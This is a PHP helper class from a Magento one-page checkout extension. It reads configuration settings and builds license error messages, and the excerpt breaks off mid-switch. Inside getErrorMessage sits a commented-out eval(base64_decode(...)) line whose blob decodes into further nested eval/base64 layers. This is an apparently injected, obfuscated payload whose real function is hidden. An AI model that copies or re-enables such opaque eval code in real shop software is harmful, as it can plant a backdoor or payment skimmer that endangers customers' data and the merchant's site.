<?php

namespace IWD\Opc\Helper;

use Magento\Framework\App\Helper\Context;
use Magento\Store\Model\StoreManagerInterface;
use Magento\Framework\HTTP\Adapter\CurlFactory;
use Magento\Framework\Message\Session\Proxy as Session;
use Magento\Framework\App\Config\ConfigResource\ConfigInterface;
use Magento\Customer\Model\Session\Proxy as CustomerSession;
use IWD\Opc\Model\FlagFactory;
use Magento\Framework\Json\Helper\Data as JsonHelper;
use Magento\Framework\App\Helper\AbstractHelper;
use Magento\Framework\UrlInterface;
use \Magento\Framework\Mail\Template\TransportBuilder;

final class Data extends AbstractHelper
{

    const XML_PATH_ENABLE = 'iwd_opc/general/enable';

    const XML_PATH_TITLE = 'iwd_opc/extended/title';
    const XML_PATH_DISCOUNT_VISIBILITY = 'iwd_opc/extended/show_discount';
    const XML_PATH_COMMENT_VISIBILITY = 'iwd_opc/extended/show_comment';
    const XML_PATH_GIFT_MESSAGE_VISIBILITY = 'iwd_opc/extended/show_gift_message';
    const XML_PATH_LOGIN_BUTTON_VISIBILITY = 'iwd_opc/extended/show_login_button';
    const XML_PATH_SUBSCRIBE_VISIBILITY = 'iwd_opc/extended/show_subscribe';
    const XML_PATH_SUBSCRIBE_BY_DEFAULT = 'iwd_opc/extended/subscribe_by_default';
    const XML_PATH_ASSIGN_ORDER_TO_CUSTOMER = 'iwd_opc/extended/assign_order';
    const XML_PATH_RELOAD_SHIPPING_ON_DISCOUNT = 'iwd_opc/extended/reload_shipping_methods_on_discount';
    const XML_PATH_DEFAULT_SHIPPING_METHOD = 'iwd_opc/extended/default_shipping_method';
    const XML_PATH_DEFAULT_PAYMENT_METHOD = 'iwd_opc/extended/default_payment_method';
    const XML_PATH_SUCCESS_PAGE_VISIBILITY = 'iwd_opc/extended/show_success_page';
    const XML_PATH_PAYMENT_TITLE_TYPE = 'iwd_opc/extended/payment_title_type';
    const XML_PATH_DISPLAY_ALL_METHODS = 'iwd_opc/extended/show_all_ship_methods';

    const XML_PATH_RESTRICT_PAYMENT_ENABLE = 'iwd_opc/restrict_payment/enable';
    const XML_PATH_RESTRICT_PAYMENT_METHODS = 'iwd_opc/restrict_payment/methods';

    const XML_PATH_GA_AB_TEST_ENABLE = 'iwd_opc/ga_ab_test/enable';
    const XML_PATH_GA_AB_TEST_CODE = 'iwd_opc/ga_ab_test/code';

    public $storeManager;
    public $resourceConfig;
    public $curlFactory;
    public $session;
    public $customerSession;
    public $flagFactory;
    public $response = null;
    public $jsonHelper;
    public $_request;
    protected $_transportBuilder;


    public function __construct(
        Context $context,
        StoreManagerInterface $storeManager,
        CustomerSession $customerSession,
        CurlFactory $curlFactory,
        Session $session,
        ConfigInterface $resourceConfig,
        FlagFactory $flagFactory,
        JsonHelper $jsonHelper,
        TransportBuilder $transportBuilder

    ) {
        parent::__construct($context);
        $this->resourceConfig = $resourceConfig;
        $this->storeManager = $storeManager;
        $this->curlFactory = $curlFactory;
        $this->session = $session;
        $this->customerSession = $customerSession;
        $this->flagFactory = $flagFactory;
        $this->jsonHelper = $jsonHelper;
        $this->_transportBuilder = $transportBuilder;

    }

    public function isEnable()
    {
        $status = $this->scopeConfig->getValue(self::XML_PATH_ENABLE);
        return (bool)$status;
    }

    public function isGaAbEnable()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_GA_AB_TEST_ENABLE);
    }

    public function getGaAbCode()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_GA_AB_TEST_CODE);
    }

    public function isCheckoutPage()
    {
        return $this->_getRequest()->getModuleName() === 'onepage'
            && $this->isEnable()
            && $this->isModuleOutputEnabled('IWD_Opc');
    }

    public function isCurrentlySecure()
    {
        return (bool)$this->storeManager->getStore()->isCurrentlySecure();
    }

    public function getTitle()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_TITLE);
    }

    public function getDefaultShippingMethod()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_DEFAULT_SHIPPING_METHOD);
    }

    public function getDefaultPaymentMethod()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_DEFAULT_PAYMENT_METHOD);
    }

    public function getRestrictPaymentMethods()
    {
        $methods = $this->scopeConfig->getValue(self::XML_PATH_RESTRICT_PAYMENT_METHODS);
        return $methods ? $this->jsonHelper->jsonDecode($methods) : [];
    }

    public function isRestrictPaymentEnable()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_RESTRICT_PAYMENT_ENABLE);
    }

    public function isShowComment()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_COMMENT_VISIBILITY);
    }

    public function isShowDiscount()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_DISCOUNT_VISIBILITY);
    }

    public function isShowGiftMessage()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_GIFT_MESSAGE_VISIBILITY);
    }

    public function isShowLoginButton()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_LOGIN_BUTTON_VISIBILITY);
    }

    public function isShowSuccessPage()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_SUCCESS_PAGE_VISIBILITY);
    }

    public function isShowSubscribe()
    {
        $moduleStatus = $this->isModuleOutputEnabled('Magento_Newsletter');
        return $this->scopeConfig->getValue(self::XML_PATH_SUBSCRIBE_VISIBILITY)
            && $moduleStatus
            && !$this->customerSession->isLoggedIn();
    }

    public function isSubscribeByDefault()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_SUBSCRIBE_BY_DEFAULT);
    }

    public function isAssignOrderToCustomer()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_ASSIGN_ORDER_TO_CUSTOMER);
    }

    public function isReloadShippingOnDiscount()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_RELOAD_SHIPPING_ON_DISCOUNT);
    }

    public function getPaymentTitleType()
    {
        return $this->scopeConfig->getValue(self::XML_PATH_PAYMENT_TITLE_TYPE);
    }

    public function getClientEmail()
    {
        return trim($this->scopeConfig->getValue('iwd_opc/general/license_email'));
    }

    public function setModuleActive($isActive)
    {
        $this->resourceConfig->saveConfig(self::XML_PATH_ENABLE, (int)$isActive, 'default', 0);
    }

    public function changeModuleOutput($outputDisabled)
    {
        $this->resourceConfig->saveConfig('advanced/modules_disable_output/IWD_Opc', $outputDisabled, 'default', 0);
    }

    public function getLicensingInformation()
    {
        return '<a href="https://www.iwdagency.com/help/general-information/managing-your-product-license">
                    licensing information
                </a>';
    }

    public function getBaseUrl()
    {
        $defaultStore = $this->storeManager->getDefaultStoreView();
        if (!$defaultStore) {
            $allStores = $this->storeManager->getStores();
            if (isset($allStores[0])) {
                $defaultStore = $allStores[0];
            }
        }

        return $defaultStore->getBaseUrl(UrlInterface::URL_TYPE_LINK);
    }

    public function getDisplayAllMethods()
    {
        return (bool)$this->scopeConfig->getValue(self::XML_PATH_DISPLAY_ALL_METHODS);
    }

    public function getErrorMessage($response)
    {
//        eval(base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSVmFFTlRWbEpYV2tSU2FHRjZRak5VYkdNMVYwZEdjbU5HWkZoaGExcEVWbXRhUjFkRk5WWmtSM2hwWVhwV1VWWldVa3RqTVVaellqTmthVkpXU2xOV2FrcFRVekZXVlZGclpHbGlSVFY1VjJ0U1UyRnNTblJrUkZaWFlsUldXRmxYYzNoa1IxWkZVbXhvYUdFd2NEWlhhMXBoWkRKU1JrOVdiR2xTTW5oWVZGVmFjMDB4WkZkWGJYQlBWakZLVjFsclZsZFViRWw1Vld0NFZrMUdjRXhhUjNoelZqSkdSazVYZEZOaE1HOTNWakowYTA1SFJYaFRiR3hvVTBkU1dWWnJWbmRYUm5CSFdrVTFiRll3Y0VwV2JURkhWR3hKZWxvemFGZE5ha0l6Vkd4a1YxZEdUbk5oUms1b1lUQndkbFp0Tlhkak1ERlhWRmhrVldKcmNGQlVWVnBMVlRGc2NWTnRkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldsZGtSMVpJWWtaa1RsSnVRWHBXTVdRd1ZERkdjazlXV21sU1ZrcFhXVmQwUzJJeFZuRlRhbEpQWWtaS1NGWldVa2RoVjBwSlVXeHdWMVl6VWxSWlZscEtaVmRXU1ZSc2NHbFdSbHBWVmxjd2VGTXhaRWRUYmxaU1lsZDRVMVJYTVZOTk1WcEZWRzF3YTAxVk1UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVGJXaE9WMFZLWVZaVVNURmpNa1pXVFVoa2FsSldXbUZaVjNSM1ZrWnNjbFp1VGxOV1ZFWkpWMnRXTUZaR1NsbFJibkJZVjBoQ1VGVlVTbE5rUms1MVZteFdhVmRIYUZwWGJGcHJWVEZKZUdFemJFOVdXRkp5V1d4Vk1XVldXa2hPVjBaYVZtdHNORlp0TlZkWFJrcHpVMnBhVjFJelVsQlpNRnBIVjBad1JtTkdTazVTVm5BeFZsUkdWMVF4Um5OaU0yeFZWMGhDYUZVd1ZrdGpiRlp4VVZSR2EySkZOVmRXUnpBeFlVVXhXVkZzY0ZaTmFsWjZXVlpWZDJReVRrWldiSEJvWVROQ1ZWZFhkRmROUmxwSFVtNUdZVkpXV2xkV2JuQnpaRlpWZUZack9WSmlSemt6V1d0V1UxVnNXWGxWYTNSV1ZrVktTRmx0ZUU5V2JGSnlWRzFvYVZJemFHRldhMk40VGtaT2MxSlliRlpoYTFwaFdWZDBWazFXYkRaVGEyUllVbXhLTUZwVlpITmhWMFkyVm01d1ZrMXFWak5hUjNoVFkyeFNkVkZzU2xkTmJFcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVmJUQXhWa1phVms1VlRscFdSWEJNVmpCYVlXUlhUa2hqUlRWb1RWaEJlRlpxU2pSVU1VWnlUMVphYVZKV1NsVlphMlJ2WVVaYVZWRnJjR3hpUjFKNldWVldNR0ZXU2xobFJYQlhZbFJXV0ZZeWVGcGtNazVKWTBab2FWSlVWa1ZXUmxaclV6QTFWMUp1VmxWaVYzaFBXVmh3VjJSc1pISldiWFJYWWtjNU5GbHJXbE5WYlVweVRsYzVWMkZyUlhoWmVrWnpaRVUxVms5WGJGTldNMmhMVmpKMGIxRXlSWGhUV0d4aFVucFdhRlp0TVU1TlZsSlhXa1U1YWxKcldqQmFWV1J6VmpBeFIyTkVUbGhXTTFKUVZWY3hSbVZIVGtkaFJUVlhUVzFvZGxadGNFOWhNREZYVkd4YVUxZEhVbFZVVldRMFVsWldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhXVlpGZVZSWWFHcFNiV2hVV1cwMVEyRkdXbFZSYTNScVRWZDRNRlJzV2s5aFZrbDNUbGhrVmxZelFrUlpWVnBLWlVaYWRFNVdhR2xTTURRd1YxWldhMUl4WkVoVldHeGhVbTVDV0ZSV1ZuZGxWbVJWVTFob1YwMXNXakJXUjNCWFZXMUdjbGR1UmxWV00yaG9XVEo0VDFadFJrZFViWFJvVFc1b1MxWldaSGRTTWtaMFUyeGFUMWRHY0ZsV2JURnZWVVpzY2xadVRsUldiRm93VkRGa2IxZEdTbFZTYmxaWVZrVktkbFY2U2xOak1rNUdZa1prYVZkRlNubFdWbEpEVXpKU1IyRXpiRTVTUmxweVZXeGtORkl4YkhKWGJUbFdUVlZaTWxaWE1ERlZNVXB5VjJwS1dHRnJTbnBWYTFwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuTmlNMlJwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pHY0hsWFdIQlRXVlV4Y21ORmJGZGlWRVoyV1ZjeFMxWldWblJPVm5CcFVqQXdlRmRzV21Ga01WcElWVmhzWVZJelFsUlVWRXB2Wld4WmVGZHRPVlZOYTNCSFdXdFdjMVpIU2xsaFNFcGFZa2RSTUZsNlJuZFRWMHBHVkcxMGFWWnJjR0ZXVkVacllURk5lRk5ZY0doVFIxSlpWbXRXZDFkR2NFZGFSVFZzVmpCd1NsWnRNVWRVYkVsNldqTm9WMDFxUWpOVWJHUlhWMFpPYzJGR1RtaGhNSEIyVm0wMWQyTXdNVmRWYTJocFVsaENVRlJWV2t0Vk1XeHhVMjEwVkdKRlZqTlZiVEF4VmtaYVZrNVZUbGhoYTBwNlZXdGFSMWRHY0VaalJrcE9VbFp3TVZaVVJsZFVNVVp6WWpOb2FWTkdXbFZaYkdodldWWmFjVlJyTlU1TlZYQklWVzAxWVZsVk1VaGxSVlpXVm0xU2NsVXllRVprTVVwMFRsWlNWMVpVVmtSV01uQkRZekZLUjFKdVVtcFNia0paVld4U1YyVnNWWGhXYXpsb1RXdFdOVlV4YUhOVWJGbDVZVWM1VjJKdVFsaFViWGhyVWxaT2NWVnRjRk5OU0VKYVYxZDBVMUV4VFhsV2JsSlFWbFJzVTFSWE1UUlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05TTWs1eldraEtXbVZzV25KVmJURTBWMVpzY21GR1pHaGhla1pIVkd4U1MxbFdTblJVV0doVlZsWmFlbFZzVlhoVFJuQklZVVpvVTFaR1ZYbFdha28wWWpGV2RGTllaR3BTVjNoVldXeG9iMk5XVWxWUmEzUk9Za2Q0TUZSc1ZUVmhWa3AwVlZSR1ZrMXVVbGhaVmxWNFkxWktkRTlXY0ZkaVZURTBWMnhrTkZKdFZsWlBWbFpUWWxkNGNGbHJWbUZrTVZsM1YyczVhbUpIT1RSVlYzQlhWV3hhTm1KSE9WZGlia0pYV2tSR1RtVkdVbk5VYlhoWFltdEtZVlpyWXpGaE1rWldUVmhHVjJGc2NGbFphMXAzVG14c1YxZHJkRlJTVkd4YVZsZDRkMVl3TVhWYU0yaFlWMGhDUkZaRVNsTmtSbFp6WVVVNVYxSlZjRXhYVjNSVFVUSktjMVZZYkdsU1ZYQnpXVmh3Y21Wc1VsWldha0pVWWtWV00xVnRNREZXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJScFVsWktWMWx0ZUV0aFJsbDNWbFJHVDJKSFVsaFhhMlF3WVZaS1dHVkZXbFZXVjFKeVZUSXhTMU5IVmtWVGJVWlRZWHBXUlZkWGNFZGpNV1JYV2toU2JGSllRbFZWYlhoMlRXeFplV1ZIZEZaaVJ6azFWbGQwYjJGR1NYcGhSWFJXWW01Q1NGbHFSbmRXYkhCSlZHMTBVMDFWY0ZwV1JsWnJZVEpHVmsxWVRtbFNlbFpWV1ZSS1UxWkdjRWhOVlhSWVVtdHdNVlZYTVhOaFYwWTJWbXRhV0ZZelFsQldha3BUVjBaV2NsVnNTbWxYUmtwM1ZrWmtkMUl5U1hoaVJtUmFaV3RhYzFsVVNqUlRWbGw1VGxkR2FHSlZXbGRWTVZKSFYyMUdjazVXYUdGV2JGcDZWVEJrVjFOV1JuTmpSVFZwVW0wNU5GWXhhSGRUTVZwMFZXeGFhVkpWY0U5VmJHaFRVekZXVlZGclpHbGlSVFZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGSmVGWnVWbGhoTTBKVVZGUktiMlZzV1hoWGJUbFVUV3hLVjFsclZtOVViR1JIWTBoR1dtSkdjRmhaYlhoelkxWlNjbU5IUms1aVJYQktWa1JDYTJFeVJuUlRiR1JZWVd4S2FGVnRNVk5YUm5CWVRWWk9VMUpyV2pGWk1HUXdWMFpLVm1JemNGaFdNMEpRVlhwQmVGSnRWa1pWYkVwcFlsWktkMVpYY0VkWlYwbDRZa1JhVkdKR2NHaFVWM014VFVaYWRHTkZkR2hTYkd3MFZqRm9kMVpHV2xoVVZFWlZWbTFTVUZrd1drZFhSMUpJWWtaT1RtSnRhRFJXYWtvMFlXc3hXRlp1VWxOaVIyaFFWbTV3VjFaV1duVmpSbVJyVW0xNGVGWkhkREJoTVVwMFpVWndWMVo2VmtSWlZsVjRZMVpXY1ZKc1VsZE5NRWt5Vm10a01GUXlUa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXM1VW1KSE9UTlphMVpUVld4WmVWVnJkRlpXUlVwSVdXMTRUMVpzVW5KVWJXaFhUVVJWZDFadE1IaGlNa1pJVm01V1ZXRjZiRk5VVnpFMFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1lVWldhVll5YUhoV1JtUTBWakpLYzFSdVJsUmlSVFZ5V1d4V2QxZFdWblJPVlU1b1ZqQndSbGxyYUVOWFJscDBWRmhvWVZKc2NETldNRnBYVjBVMVYxRnRSbXhoTUhCT1ZsUkdWMVF4Um5OaU0yUnBVbFpLVTFacVNsTlRNVlpWVVd0a2FXSkZOVmRXUjNSTFdWVXhTR1ZGVmxaV2JWSnlWVEo0Um1WR1RuRlJiR2hwVWpKb1VWZHNaRFJqTVdSSFkwVm9iRkpZUWxSVmExWkxaRlpWZUZwRVVsWk5hMncxVlcxNGMxWldXWGxWYldoV1ltNUNlbFJWV210V01YQkpWRzEwVjFZemFFcFhWbFpyWWpKR2RGWnNXbFJpYTBwWldXdGtVMWRHY0VkV2JrNVVVbTFTTVZZeU1YZGhWbHBaVVdwT1YwMXVVbkpXVkVwTFUwWk9kVkZzU21oaE1IQjNWMnhhVjFOdFZrZGlSRnBVWWtad2FGUlhlRXRUVm14V1lVVk9hR0pXV2xkVk1qVjNWMnhhZEZWc1FscGhNbEpNV2taYVUyUkhWa2hTYkVwT1VsYzVObFl4VWtwa01EVllVbGhzVm1KSGFGWlpWM1JMVkd4c1YxWnJaRlZOVlZZMVdXdFdTMWxWTVVobFJWWldWbTFTY2xVeWVFWmtNVXAwVGxaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXZDFZeFpGaE9XRTVTVFdzeE5Ga3dXbTlWTWtwMFpVaENXbFpzV2t4VVZWcHpZMVpTY21SSGJGTldNMmhLVmtSR2IyTXhUbk5VYTJSVVlXdHdWVlpzWkc5VVJteHlXa1U1V0Zac2NEQmFWV1IzVkdzeFZsZHVWbGhYU0VKUVZtcEtVbVZXVW5KaFJrSllVak5vZVZaV1VrOWhNa3B6WVROa1lWSkdTbkJWYlRFMFYyeGFTRTFVVWxSaVJUVkhXVEJvVDFsV1NqWlNibkJhWVRKU1ZGUnNXa2RrVm1SMFpFWm9VMVl6YURGV1ZFb3dZVEExU0ZSclpHaE5NbmhZV1cxNFlXTldVbGhOVkZKT1ZtMVNlRlZYTlU5aE1WcDFVV3BDVlUxWGFIcFpWbHBhWkRGa1dWcEdjRmRpVlRCNFYydGFWMDVIVGtkVWJGWmhVbFphVjFadWNITmtWbFY0Vm1zNVVtSkhPVE5aYTFaVFZXeFplVlZyZEZaV1JVcElXVzE0VDFac1VuSlRiVVpPVWpOb1JsWldXbXRoTVdSMFUyNUthbE5GTlZsV2JURlRUbXhTY1ZGc1RsWmlWV3cxVjJ0V2QxVnJNVVpYYmxaV1RWWmFVRlZYZUhaa01rcEdWV3hLVjAxc1NreFdWbEpEVXpKT1YxcEdaR2hTVkd4d1ZXeGtORkpXWkhKYVJ6bGFWbXRzTkZVeU1IaFhSMFY1VkZSR1lWSldjSHBXTUdSTFUxWmFjMkpGTldsVFJVb3lWakZhWVdFd05VaFRhMlJxVWxaS1lWcFhlSGRTYkZwWFdYcFdhV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldSRll5Y0VOak1VcEhVbXhvWVZKWVVsUmFWM1JoWld4a1dXTkZPVlZOYTFwSVdXcE9jMVl4V1hsVmJFcFhWa1ZLU0Zrd1dtRmpWazV6VjIxR1RtSkZXVEZXYlRBeFl6RnNWMVpZWkZSWFIyaGhXV3hTUjFOR2JGZGFSWFJVVW14d1dWZHJaREJWTWxaMFlVaFdXR0V5VGpSV2FrcFhWMFpLYzJGR2FHaGlSbkJNVmxSQ1lWTXlVbk5pUm1Sb1VsUldhRlJXYUVOVFZsRjRZVVpPV0dKR2JEVmFWVkpIVmtaYVdHRklTbHBOUjFKVVZUQmFkbVZXY0VobFJtUnNZbGhSTUZZeFVrdGpNVVY1VlZoc1ZXSnNTbEZXYWs1VFkyeGFjVkZVUW10TlZUVlhWMnRTVTJGc1NuUmtSRlpYWWxSV1dGbFhjM2hqTVZweFVteFNWMVpXV1hwV1dIQkRZekZLUjFKc2FHRlNXRUpUVkZWV1lXUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14a2NsUnRjRTVYUlVwYVZsY3dNV1F4YkZkV1dHUlVZbFJzV1ZaclZURldSbXQzV2taT2ExSnJjSGhWVnpGSFZtc3hSbUpFVGxoV2JGcHlXWHBLVjJOdFNrWmhSbHBwWWtoQ2QxWnRjRU5aVjFGNFlraFNhVkpWTlhGVmFrSjNaREZXV0dOR1pHaFdWRUkwVmpKd1YxWkdXbGhWYkVKVlZtMVNUMXBYZUZka1ZtUjBZa1prVGxadE9IaFdWRVpYWVRGSmVWSnVUbWhOTW5oUlZtdFdZV05HYkhSbFJXUnBZa2RTV0ZsVldrdFpWVEZXVGxab1dHRXhXbGhXUm1SSFZteEtjazlXU2s1aVdHaEVWakp3UTJNeFNrZFNiR2hoVWxoQ1UxUlZWbUZrVmxWNFZtczVVbUpIT1ROWmExWlRWV3haZVZWcmRGWldSVXBNVm0xNGMyUlhTa1pVYlhCT1YwVktXbFpYTURGak1rWllVbXhhVkdGclNtRlpWM014VkVac2NsWnVUbFJTVkd4YVdXdFdkMVpHU25KaU0yeFdUVlphZGxWNlNrdFRSbEp6WWtaa2FWZEhhSGhXUmxKSFVqSktjMkpFV2xWaVIxSnlWRmR6TVZOV1VYaGhTRTVvVFZWV05sZHJZekZYYXpGSVZWUkNXbUV4Y0hwV01WcFRaRWRXUm1OR1VsTlhSVW8yVmpKMGFtVkhUWGxUYTJoV1lXeGFVMWx0ZUhkamJGbDNWbTVPYVdKRk5YbFhhMUpUWVd4S2RHUkVWbGRpVkZaWVdWZHplR1JIVmtWU2JHaG9ZVEJ3TmxkcldtRmtNbEpHVDFac2FWSXllRmhVVlZwelRURmtWMWR0Y0U5V01VcFhXbFZvUTFaR1draFZhMXBYVm0xTk1WbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGTmlWRlpWVm14Vk1WRXhaSEZSYms1VFVtdGFXVmRyV25kaFYwVjZVVzV3VjAxV2NISmFWM013WkRGV2MxTnRiRTVpVmtwTVZsWlNRMUl5U25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpYV2tkMFZHSkZWak5WTWpWSFYwWmFkR0ZHUWxwaE1WcDZWV3RhZDFOV1VuUmhSbVJPVWtaYU5sWXhZM2ROVmxGNVUydGtZVTB5ZUZkWmJYUkxZMVpTV0dSSFJtcFNiWGg1VjJ0YWEyRkZNVWxSVkVwYVlXdEZlRlZyWkVkV2JFcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNZa2M1TTFsclZsTlZiRmw2Vlc1Q1YyRnJXbWhVYlhoelRteE9jbHBIYkdsVFJVcFdWbFphVTJNeFRuTlNXR1JxVWpCYVlWbFhjekZYUm5CWFZtNU9WRkl4V2twVlYzaDNWRzFLUjJJemFGaFhTRUpNVm0xNGRtVldTbkpoUms1cFltdEtURlpYY0VOa01rMTRXa2hPV21WclNtaFVWbWhEVTFac2NtRklaRmhpUm13eldUQm9kMWRIU2toVmJFNWhVbXhhZWxWWGMzaFNiVkpHWTBaS1RsSldjREZXVkVaWFZERkdjMkl6WkdsU1ZrcFRWbXBLVTFNeFZsVlJhMlJwWWtVMVYxWkhkRXRaVlRGSVpVVm9WMVo2Vm1oVk1uaEtaVzFHU1ZSc2FGZGlWMmhOVjJ0YVYyTXhUa1pOVm14WVlsaENjRlp0ZUdGa1ZtUllZMFU1VkdKSE9UVldWM1J2VlVaSmVWVnVSbHBpUm5Cb1ZHdGFkMUl4Y0VkYVIzaHBWbXR3UmxaV1l6RmtNa1Y0V2tWYVZHRnJOV0ZaVjNNeFZFWlNWbFpxVWxOU2Exb3hWMnRrYzFVd01WZGpTRnBZVjBoQ1RGWnRlSFpsVmxKMVZXeGthR0V6UW5aV2JYQkhWMjFXYzFSc1dscGxiRnBQVm1wQk1XUXhWbGRhUkVKb1ZtdHNOVnBWYUVkWFIwcElWRmhvWVZaNlJraFdNRlV4VjBVMVYxVnNaR3hpUm05M1ZqRmtkMVF4VFhsVmEyUnBVbTE0VjFsdGRFdGpSbEpZWTBaT1RsWnJOVmxaTUdoM1ZsZEZkMDVZWkZaV2JWSnlWVEo0Um1ReFNuUk9WbEpYVmxSV1JGWXljRU5qTVVwSFVteG9ZVkpZUWxOVVZWWmhaRlpWZUZack9WSk5hMXBaVmtjMVUxWXlTbGhoUnpsaFZucFdVRlpFUmtabFYwcEdVMjFHVGxJemFFWldWbHByWVRGT2MxSllaRk5pVkZaVlZteFZNVkV4WkhGUmJrNVVVbXhLTUZsVlpIZFViVXBIVjI1V1ZrMXVRa3hVYTJSUFVqSkZlbUpHWkdsaVJuQjRWa1prTkZsWFNsZGFTRTVvVW5wc2NsUlhkR0ZYYkZWNVRWUlNXbFpyVmpWV1JsSkxWVEZLY2xkcVNsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYVZKV1NsTldha3BUVXpGV1ZWRnJaR2xpUlRWNVYxUk9iMkZXU1hkTlZGcFhVbnBHZGxkV1ZYaGpNVnAwVGxaYVUyRjZWa1JYVmxwaFlURmtSazlXVmxOaVdFSnZWbXhXZDA1c1pGZFhiWFJWVFd0d1NWVXlOVmRXVjBwWllVVjBWbUZyV2pOVVYzaHlaVmRLUmxSck5WTk5SbkJLVjFkMGIyUXhUbk5VYTFwVVlXeGFZVmxYZEhkV1JsSlhWMjVLYkdKR1dsbFhhMlJ2VlRBeFIySjZTbFpOVmxweVZtcEJNVk5HVW5KaFIyeFVVak5vYjFadGNFZFNNREZYVTJ0a1UySnNjR2hVVldRMFVsWldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhXVlpWZVZWdVNtbFNWMmh6VldwT2IxbFdXWGRXYm1ST1ZtczFWMWRVVG05aE1rcFdUbFJDVjJKSFVuSlpWbFYzWkRKS1NFNVhSbE5XTURCM1ZqSndTMVF5VWtkWGJsWm9Vak5TV0ZSV1duWk5iR1J5Vm1zNVVrMXNXakJXVjNoelZXMUtkRlZ1UWxWV1JVb3lXa1JHVTFKc1VuSlViWFJPWVROQ1NsWnRNSGhpTWtaeVRWaE9WMkpVVm1GVVYzQkhWMFpTV0UxVlpGaFNiSEI0VmtkMGQxVXlWblJrUkZKWVZrVndlbFZYTVVabFZrNXlZVWRzVTAwd1NtOVdiVFYzVmpBMWMySkdaRnBsYTFwd1dXdFZNVmRXVW5OWk0yaG9WbFJDTTFrd1VrTlhSbHAwWVVaU1drMUhVa3RhVmxVeFUxWmFjbU5IYUdsaGVsWlJWbFpTUzJNeFJuTmlNMlJwVWxaS1UxWnFTbE5UTVZaVlVXdGthV0pGTlZkV1IzUkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhUblZSYkhCT1lXdGFXVmRXVm10U01EVjBWRmhrVDFaV1NtOVdiRlpoWkZaVmVGWnJPVkppUnpreldXdFdVMVZzV1hsVmEzUldWa1ZLU0ZsdGVFOVdiSEJIVkcxc1UySnJTWGRXVnpGM1VqSkdWMVJyWkZOV1JYQlVWVzEwWVUxc1pIRlJiazVUVW10YVdWZHJWbmRWYXpGR1YyNVdWazFXV2xCVlYzaDJaREpLUmxWc1NsZE5iRXBNVmxaU1ExSXlTbk5VYmtwYVRUSm9jRlZxUVhoT2JGcElUVmM1V2xaVVJucFdiVEF4Vm14S2NrNVZUbHBpV0ZJelZHMHhUbVF3TlZaVmJXaFhWbFp3TVZaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFpFWmFWMVZZWkZCV1dFRXhXVlJPUTFWSFVqWk5SR3hMWlZkMGQxUXpZemxRVTJOd1MxUnpQU2NwS1RzPScpKTs='));

        $message = '';
        $licensingInformation = $this->getLicensingInformation();
        $email = $this->getClientEmail();
        $errorCode = $response['ErrorCode'];
        switch ($errorCode) {
            case 'no_license':
                $message = "We were unable to locate a license with your email $email. 
                Please enter the email address used to purchase this product from IWD. 
                To learn more, please review our $licensingInformation.";
                break;
            case 'domains_limit':
                $domainsCount = isset($response["DomainsCount"]) ? (int)$response["DomainsCount"] : 3;
                $message = "You have used the maximum of $domainsCount domains for your license. 
                To learn more or to request support, please review our $licensingInformation.";
                break;
            case 'domain_banned':
                $message = "This domain has been forbidden to use this licensed product. 
                To learn more or to request support, please review our $licensingInformation.";
                break;
            case 'add_domain_failed':
                $message = "We were unable to verify this domain with your product license. 
                Please activate this domain in your customer account at IWD. 
                To learn more or to request support, please review our $licensingInformation.";
                break;
